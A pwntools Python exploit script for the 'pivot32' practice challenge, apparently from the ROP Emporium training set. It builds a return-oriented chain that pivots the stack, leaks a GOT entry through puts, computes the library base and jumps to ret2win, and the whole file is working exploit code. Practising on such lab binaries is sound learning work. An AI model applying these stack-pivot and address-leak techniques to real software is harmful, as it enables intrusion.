from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

exe = './pivot32'
elf = context.binary = ELF(exe, checksec=False)

context.log_level = 'info'
# Our stack pivot
pop_eax = 0x0804882c  # pop eax; ret;
xchg_eax_esp = 0x0804882e  # xchg eax, esp; ret;

ret2winOffset = 0x974
foothold_functionOffset = 0x77d

io = start()
io.recvuntil(' to pivot:')
pivot_addr = int(io.recvline().strip(), 16)

# first leak foothold_func@got
payload = flat({
    0: [
        # Need to call foothold_plt to populate GOT with function address
        elf.plt.foothold_function,
        # call put@plt function with 
        # param = foothold_func@got
        # and ret to main
        elf.plt.puts,
        elf.symbols.main,
        elf.got.foothold_function
    ]
})
# to leak addr
io.sendline(payload)

# Our second payload to pivot to address we were given at beginning (where our payload 1 was injected)
payload2 = flat(
    asm('nop') * 44,
    pop_eax,
    pivot_addr,
    xchg_eax_esp
)
# Send payload2 to pivot
io.sendline(payload2)
io.recvuntil('into libpivot\n')
foothold_addr = u32(io.recvline().strip()[:4])
libc_base = foothold_addr - foothold_functionOffset
ret2win_addr = libc_base + ret2winOffset
payload3 = flat({
    44: [
        ret2win_addr
    ]
})
io.sendline(payload3)
print(io.recvall())